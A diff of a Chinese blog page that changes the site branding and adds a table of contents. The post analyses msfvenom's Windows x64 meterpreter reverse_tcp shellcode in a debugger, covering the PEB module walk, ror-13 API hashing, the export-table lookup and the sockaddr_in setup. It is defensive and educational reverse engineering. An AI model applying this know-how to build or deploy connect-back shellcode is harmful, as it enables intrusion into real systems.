@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-<head>
+<!DOCTYPE html><html lang="zh-cn"><head>
   <meta charset="utf-8">
-  <title>msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1 | shanza's hideout</title>
+  <title>msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1 | shanza's blog</title>
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="keywords" content="">
@@ -12,12 +10,12 @@
 
   
 
-  <meta name="description" content="环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器）  参考文章https:&#x2F;&#x2F;www.cnblogs.com&#x2F;resea&#x2F;p&#x2F;18884902 准备生成 raw payload。此处应根据环境设置 LHOST 参数和 LPORT 参数： $ msfvenom -p windo">
+  <meta name="description" content="环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器）  参考文章https://www.cnblogs.com/resea/p/18884902 准备生成 raw payload。此处应根据环境设置 LHOST 参数和 LPORT 参数： $ msfvenom -p windo">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1">
 <meta property="og:url" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/index.html">
-<meta property="og:site_name" content="shanza&#39;s hideout">
-<meta property="og:description" content="环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器）  参考文章https:&#x2F;&#x2F;www.cnblogs.com&#x2F;resea&#x2F;p&#x2F;18884902 准备生成 raw payload。此处应根据环境设置 LHOST 参数和 LPORT 参数： $ msfvenom -p windo">
+<meta property="og:site_name" content="shanza's blog">
+<meta property="og:description" content="环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器）  参考文章https://www.cnblogs.com/resea/p/18884902 准备生成 raw payload。此处应根据环境设置 LHOST 参数和 LPORT 参数： $ msfvenom -p windo">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/01.png">
 <meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/02.png">
@@ -72,7 +70,7 @@
 <meta name="twitter:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/01.png">
   <meta name="generator" content="Hexo 7.3.0">
   <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/"},"headline":"msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1","description":"环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器） 参考文章https://www.cnblogs.com/resea/p/18884902 准备生成 raw payload。此处应根据环境设置 ","datePublished":"2026-10-27T15:42:13.000Z","dateModified":"2026-10-28T03:29:29.660Z","author":{"@type":"Person","name":"shanza"},"publisher":{"@type":"Organization","name":"shanza's hideout","logo":{"@type":"ImageObject","url":"https://shanzade.github.io/favicon.ico"}}}
+{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/"},"headline":"msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1","description":"环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器） 参考文章https://www.cnblogs.com/resea/p/18884902 准备生成 raw payload。此处应根据环境设置 ","datePublished":"2026-10-27T15:42:13.000Z","dateModified":"2026-10-28T03:29:29.660Z","author":{"@type":"Person","name":"shanza"},"publisher":{"@type":"Organization","name":"shanza's blog","logo":{"@type":"ImageObject","url":"https://shanzade.github.io/favicon.ico"}}}
 </script>
 
   
@@ -89,7 +87,116 @@
   
 <script src="/js/theme_mode.js"></script>
 
-<!-- hexo injector head_end start --><style id="custom-font">
+<!-- hexo injector head_end start -->
+<style>
+#toc-list a{
+  text-decoration: none;
+  color:#333 !important;
+}
+#toc-desktop ul{
+  list-style: none;
+  padding-left: 3px;
+}
+
+/* 展开状态 */
+#toc-desktop {
+  position: fixed;
+  right: 0;
+  top: 0;
+  height: 100vh;
+  width: 260px;
+
+  padding: 10px;
+
+  background: #fff;
+  border-left: 1px solid #ddd;
+
+  /* 关键：动画 */
+  transition: transform 0.25s ease;
+  will-change: transform;
+
+  color:#333;
+  font-size:1rem;
+  z-index: 9999;
+
+  display: flex;
+  flex-direction: column;
+  transform: translateX(0);
+}
+
+/* 收起状态：只露出 toggle */
+#toc-desktop.collapsed {
+  transform: translateX(calc(100%));
+}
+
+/* toggle 固定在可见边缘 */
+#toc-toggle {
+  position: absolute;
+  left: -30px;
+  top: 50%;
+  width: 80px;
+  height: 80px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  user-select: none;
+  background: #fff;
+  border-left: 2px solid #ddd;
+  color: #333;
+  border-radius: 20%;
+  z-index:-1;
+  font-size: 25px;
+  font-weight: bold;
+
+  display: flex;
+  align-items: center;
+  justify-content: left;
+  
+  padding:5px;
+}
+
+#toc-list {
+  flex: 1;
+  overflow-y: auto;/* 关键：滚动 */
+  overflow-x: hidden;
+  margin-left:5%;
+}
+#toc-mobile {
+  display: none;
+}
+
+/* indentation */
+.toc-lv-2 { margin-left: 12px; }
+.toc-lv-3 { margin-left: 24px; }
+.toc-lv-4 { margin-left: 36px; }
+
+#toc-title{
+  font-weight: bold;
+  font-size: 1.2rem;
+  margin:10px auto;
+}
+@media (max-width: 1024px) {
+  #toc-desktop {
+    display: none;
+  }
+
+  #toc-mobile {
+    display: block;
+    width: 100%;
+    height: auto;
+    padding: 5%;
+    border-bottom: 1px solid #eee;
+    background: #fafafa;
+  }
+  #toc-mobile li{
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+}
+</style>
+
+
+  <style id="custom-font">
   @font-face {
     font-family: "Montserrat";
     src: url("/fonts/Montserrat-Regular.woff2") format("woff2");
@@ -164,7 +271,7 @@
   <header class="sea-header">
     <nav class="sea-nav-wrap">
   <div class="sea-nav-logo" title="">
-    <a href="/">shanza's hideout</a>
+    <a href="/">shanza's blog</a>
   </div>
   <div class="sea-nav-menus">
     <div id="sea-nav-toggle">
@@ -174,35 +281,19 @@
     <div id="sea-nav-dimmer"></div>
 <div class="sea-menu-wrap">
   
-    <a
-      class="sea-menu-link "
-      
-      href="/posts/"
-    >
+    <a class="sea-menu-link " href="/posts/">
       所有文章
     </a>
   
-    <a
-      class="sea-menu-link "
-      
-      href="/categories/"
-    >
+    <a class="sea-menu-link " href="/categories/">
       分类
     </a>
   
-    <a
-      class="sea-menu-link "
-      
-      href="/tags/"
-    >
+    <a class="sea-menu-link " href="/tags/">
       标签
     </a>
   
-    <a
-      class="sea-menu-link "
-      
-      href="/archives/"
-    >
+    <a class="sea-menu-link " href="/archives/">
       归档
     </a>
   
@@ -225,10 +316,105 @@
   </div>
 </nav>
   </header>
-  <main id="sea-main-wrapper" data-pagefind-body>
+  <div id="toc-mobile">
+    <div id="toc-title">Contents</div>
+    <ul id="toc-list-mobile">
+      
+        <li class="toc-lv-1">
+          <a href="#heading-0">msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#环境">环境</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#参考文章">参考文章</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#准备">准备</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#开始调试">开始调试</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#初始化">初始化</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#查找与调用函数">查找与调用函数</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#继续建立通信">继续建立通信</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#总结">总结</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#（分析内容-汇编存档）">（分析内容/汇编存档）</a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div id="toc-desktop" class="collapsed">
+      <div id="toc-toggle">&gt;</div>
+      <div id="toc-title">Contents</div>
+      <ul id="toc-list">
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#heading-0">msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#环境">环境</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#参考文章">参考文章</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#准备">准备</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#开始调试">开始调试</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#初始化">初始化</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#查找与调用函数">查找与调用函数</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#继续建立通信">继续建立通信</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#总结">总结</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#（分析内容-汇编存档）">（分析内容/汇编存档）</a>
+          </li>
+        
+      </ul>
+    </div>
+  
+  <main id="sea-main-wrapper" data-pagefind-body="">
     <article class="sea-page-card-wrapper">
   <header class="sea-article-header">
-    <h1 class="sea-article-title">msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1</h1>
+    <h1 class="sea-article-title" id="heading-0">msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1</h1>
     
       <div class="sea-post-meta sea-post-meta__center">
         <div class="sea-post-time">
@@ -270,17 +456,17 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>shellcode 前三行：<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/06.png"></p>
 <p><strong>为什么说 <code>call notepad.FFD03646</code> 是将接下来的 shellcode 地址放到栈上呢？</strong><br>双击过去看看：<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/07.png"></p>
 <p>是一个 <code>pop rbp</code>。也就是说，<code>call</code> 的过程中会自动将 <code>call</code> 之后的下一条指令的地址，放到栈上，而 <code>pop rbp</code> 则会将 <code>rsp</code> 指向的内容给到 <code>rbp</code>，即 <code>rbp</code> 将会存放<code>call</code> 之后的下一条指令的地址，通过这种方式完成了地址的记录。</p>
-<p>那，<strong>为什么正好就跳到了这个位置？</strong><br>其实这里的 <code>call notepad.FFD03646</code> 是调试器解析有误，此处的 <code>call ?? ?? ?? ??</code> 后面四个字节是偏移，小端序，即 0xCC。<br>加上跳转规则：目标地址 &#x3D; 当前指令地址 + 指令本身长度 + 偏移量<br>最终总共是 0xD1 个字节距离，575h + 0d1h &#x3D; 646h。<br>对于 jcc 指令来说，这条规则同样适用。</p>
+<p>那，<strong>为什么正好就跳到了这个位置？</strong><br>其实这里的 <code>call notepad.FFD03646</code> 是调试器解析有误，此处的 <code>call ?? ?? ?? ??</code> 后面四个字节是偏移，小端序，即 0xCC。<br>加上跳转规则：目标地址 = 当前指令地址 + 指令本身长度 + 偏移量<br>最终总共是 0xD1 个字节距离，575h + 0d1h = 646h。<br>对于 jcc 指令来说，这条规则同样适用。</p>
 <hr>
 <p>接下来是两块内容的初始化，一是 dll 字符串，二是一个 <code>sockaddr_in</code> 结构体。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/08.png"></p>
 <p>字符串显而易见。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/09.png"></p>
 <p><code>sockaddr_in</code> 结构体定义如下。<br>其中要注意的是，<code>sin_port</code> 和 <code>sin_addr</code> 都是大端序，使用 <code>htons</code> 和 <code>htonl</code> 进行转换。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> <span class="token punctuation">&#123;</span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> <span class="token punctuation">{</span>
      <span class="token keyword">short</span>            sin_family<span class="token punctuation">;</span>    <span class="token comment">// 2 字节 ，地址族，e.g. AF_INET, AF_INET6</span>
      <span class="token keyword">unsigned</span> <span class="token keyword">short</span>   sin_port<span class="token punctuation">;</span>      <span class="token comment">// 2 字节 ，16位TCP/UDP 端口号 e.g. htons(3490)，</span>
      <span class="token keyword">struct</span> <span class="token class-name">in_addr</span>   sin_addr<span class="token punctuation">;</span>      <span class="token comment">// 4 字节 ，32位IP地址</span>
      <span class="token keyword">char</span>             sin_zero<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 8 字节 ，不使用</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <table>
 <thead>
@@ -320,23 +506,23 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <p>首先给 <code>rdx+18h</code> 的位置解引用，这个位置存放了 ldr 的指针。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB</a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x380 bytes (sizeof)</span>
 <span class="token keyword">struct</span> <span class="token class-name">_PEB</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
     UCHAR InheritedAddressSpace<span class="token punctuation">;</span>                                            <span class="token comment">//0x0</span>
     UCHAR ReadImageFileExecOptions<span class="token punctuation">;</span>                                         <span class="token comment">//0x1</span>
     UCHAR BeingDebugged<span class="token punctuation">;</span>                                                    <span class="token comment">//0x2</span>
     <span class="token keyword">union</span>
-    <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">{</span>
         UCHAR BitField<span class="token punctuation">;</span>                                                     <span class="token comment">//0x3</span>
         <span class="token keyword">struct</span>
-        <span class="token punctuation">&#123;</span>
+        <span class="token punctuation">{</span>
             UCHAR ImageUsesLargePages<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                                    <span class="token comment">//0x3</span>
             UCHAR IsProtectedProcess<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                                     <span class="token comment">//0x3</span>
             UCHAR IsLegacyProcess<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                                        <span class="token comment">//0x3</span>
             UCHAR IsImageDynamicallyRelocated<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                            <span class="token comment">//0x3</span>
             UCHAR SkipPatchingUser32Forwarders<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                           <span class="token comment">//0x3</span>
             UCHAR SpareBits<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">;</span>                                              <span class="token comment">//0x3</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
     VOID<span class="token operator">*</span> Mutant<span class="token punctuation">;</span>                                                           <span class="token comment">//0x8</span>
     VOID<span class="token operator">*</span> ImageBaseAddress<span class="token punctuation">;</span>                                                 <span class="token comment">//0x10</span>
     <span class="token keyword">struct</span> <span class="token class-name">_PEB_LDR_DATA</span><span class="token operator">*</span> Ldr<span class="token punctuation">;</span>                                              <span class="token comment">//0x18</span>
@@ -346,7 +532,7 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <p>接下来继续解引用，<code>rdx+20h</code> 指向了一个结构体 <code>InMemoryOrderModuleList</code>。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB_LDR_DATA">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB_LDR_DATA</a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x58 bytes (sizeof)</span>
 <span class="token keyword">struct</span> <span class="token class-name">_PEB_LDR_DATA</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
     ULONG Length<span class="token punctuation">;</span>                                                           <span class="token comment">//0x0</span>
     UCHAR Initialized<span class="token punctuation">;</span>                                                      <span class="token comment">//0x4</span>
     VOID<span class="token operator">*</span> SsHandle<span class="token punctuation">;</span>                                                         <span class="token comment">//0x8</span>
@@ -356,20 +542,20 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
     VOID<span class="token operator">*</span> EntryInProgress<span class="token punctuation">;</span>                                                  <span class="token comment">//0x40</span>
     UCHAR ShutdownInProgress<span class="token punctuation">;</span>                                               <span class="token comment">//0x48</span>
     VOID<span class="token operator">*</span> ShutdownThreadId<span class="token punctuation">;</span>                                                 <span class="token comment">//0x50</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>如果去查找 <code>_LIST_ENTRY</code> 这个结构体的话，会发现这个结构体完全和 <code>rdx+4ah</code> 搭不上边，因为这个结构体里面只有两个成员。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LIST_ENTRY">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LIST_ENTRY</a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x10 bytes (sizeof)</span>
 <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
     <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span><span class="token operator">*</span> Flink<span class="token punctuation">;</span>                                              <span class="token comment">//0x0</span>
     <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span><span class="token operator">*</span> Blink<span class="token punctuation">;</span>                                              <span class="token comment">//0x8</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其实，<code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code> 这三个成员，本质上都是 <code>_LDR_DATA_TABLE_ENTRY</code> 结构体类型。（使用 <code>_LIST_ENTRY</code> 应该只是为了方便遍历？）<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LDR_DATA_TABLE_ENTRY">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LDR_DATA_TABLE_ENTRY</a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0xe0 bytes (sizeof)</span>
 <span class="token keyword">struct</span> <span class="token class-name">_LDR_DATA_TABLE_ENTRY</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
     <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InLoadOrderLinks<span class="token punctuation">;</span>                                    <span class="token comment">//0x0</span>
     <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InMemoryOrderLinks<span class="token punctuation">;</span>                                  <span class="token comment">//0x10</span>
     <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InInitializationOrderLinks<span class="token punctuation">;</span>                          <span class="token comment">//0x20</span>
@@ -391,11 +577,11 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <p>也就是说，<code>rdx+4ah</code>，通过前面的 <code>InMemoryOrderModuleList</code> 0x10 偏移之后，对应的应该是结构体 0x5a 的位置，在 <code>BaseDllName</code> 里面，而不是 <code>FullDllName</code>（前者 <code>Base</code> 是只记录 dll 文件名称，而后者 <code>Full</code> 除了记录 dll 名称之外还会记录其所在路径）。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_UNICODE_STRING">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_UNICODE_STRING</a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x10 bytes (sizeof)</span>
 <span class="token keyword">struct</span> <span class="token class-name">_UNICODE_STRING</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
     USHORT Length<span class="token punctuation">;</span>                                                          <span class="token comment">//0x0</span>
     USHORT MaximumLength<span class="token punctuation">;</span>                                                   <span class="token comment">//0x2</span>
     USHORT<span class="token operator">*</span> Buffer<span class="token punctuation">;</span>                                                         <span class="token comment">//0x8</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最终，<code>rcx</code> 存放被遍历的 dll 的 <code>BaseDllName</code> 中 <code>MaximumLength</code> 的值，<code>rsi</code> 存放 <code>BaseDllName</code> 中的 <code>Buffer</code>，即 dll 名称字符串。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/13.png"></p>
 <hr>
@@ -405,21 +591,21 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <p><code>cmp al, 61</code>、<code>jl 0x2</code>、<code>sub al, 20</code> 这三者构成了最简单的小写转大写功能。首先判断字符是否是大写，<code>0x61</code> 对应的是小写的 <code>a</code>。<br><code>jl 0x2</code> 小于跳转，根据上面的跳转规则来看此处偏移总共是 4，即跳到 <code>35a7</code> 的位置。<br><code>sub al, 20</code> 将小写转大写，例如 <code>61h - 20h = 41h</code> 对应大写的 <code>A</code>。<br>其实说“小写转大写”也不太恰当，因为 ascii 表里面小写字母后面还有其他可见字符。此处估计没有考虑这么多。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/15.png"></p>
 <p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/16.png"></p>
 <p><code>ror r9d, D</code> 将 <code>r9d</code> 循环右移 13 位。然后 <code>add r9d, eax</code> 将刚才加载的字符（经过变换后）存到 <code>r9d</code> 寄存器。<br>最后 <code>loop 0xed</code>，是什么意思呢？</p>
-<pre class="line-numbers language-none"><code class="language-none">E2 cb LOOP rel8   Decrement count; jump short if count !&#x3D; 0。 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">E2 cb LOOP rel8   Decrement count; jump short if count != 0。 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>即，一个循环。使用的寄存器是 <code>ecx</code>，正好对应前面提取 <code>MaximumLength</code> 即 dll 文件名字符串的长度。<br>这里的 <code>rel8</code> 是有符号数，<code>0xed</code> 即十进制下的 -19。<br>回顾前面提到的跳转偏移计算规则，计算地址的距离 <code>35ae + 指令长度 2 - 359d = 0x13 = 19</code>，二者正好对应，于是跳回到 <code>xor rax, rax</code> 准备清空字符，并令 <code>ecx</code> 计数器 -1。非常巧妙。</p>
 <p>最终 <code>r9d</code> 存放了 BaseDllName 的一串小哈希。</p>
 <hr>
 <p><em>检查导出表。</em></p>
 <p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/17.png"></p>
-<p>将当前 dll &#x2F; <code>_LDR_DATA_TABLE_ENTRY</code> 指针压到栈上存下来，以及对应的 dll hash 也留到栈上。</p>
+<p>将当前 dll / <code>_LDR_DATA_TABLE_ENTRY</code> 指针压到栈上存下来，以及对应的 dll hash 也留到栈上。</p>
 <p>回顾先前的内容，<code>rdx+20</code> 在这里应该是 <code>rdx+30</code>，对应了 <code>_LDR_DATA_TABLE_ENTRY</code> 的 <code>DllBase</code> 成员，这个指针指向了一块区域，这块区域存放着对应 pe 文件在硬盘上原有的样子（即，pe 结构以文件形式存放在硬盘上，与被加载到内存中，是两种不同的情况，这里 <code>DllBase</code> 指的是前者）。<br>随后 <code>rdx+3c</code>，熟悉 pe 结构的话就能知道，这里是 pe 结构里面的 <code>e_lfanew</code>，对应文件中 <code>_IMAGE_NT_HEADERS</code> 的偏移。<br>通过 <code>rax + rdx</code> 就可以得到 <code>_IMAGE_NT_HEADERS</code>。<br>接下来 <code>rax+18h</code> 读取 pe 位数，如果不是 64 位的话就跳出去了。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">{</span>
  DWORD Signature<span class="token punctuation">;</span> <span class="token comment">// PE标识  0</span>
  IMAGE_FILE_HEADER FileHeader<span class="token punctuation">;</span> <span class="token comment">// 标准PE头  4</span>
  IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span> <span class="token comment">// 扩展PE头  18h</span>
-<span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span>
 
-<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">{</span>
  WORD Machine<span class="token punctuation">;</span> <span class="token comment">// 可以运行在什么样的CPU上  4h</span>
  WORD NumberOfSections<span class="token punctuation">;</span> <span class="token comment">// 表示节的数量  6h</span>
  DWORD TimeDateStamp<span class="token punctuation">;</span> <span class="token comment">// 编译器填写的时间戳  8</span>
@@ -427,16 +613,16 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
  DWORD NumberOfSymbols<span class="token punctuation">;</span> <span class="token comment">// 调试相关  10h</span>
  WORD SizeOfOptionalHeader<span class="token punctuation">;</span> <span class="token comment">// 扩展PE头的大小  14h</span>
  WORD Characteristics<span class="token punctuation">;</span> <span class="token comment">// 文件属性  16h</span>
-<span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后 <code>rax+88</code> 获取导出表 rva，如果导出表是空的话也是直接跳出去了。</p>
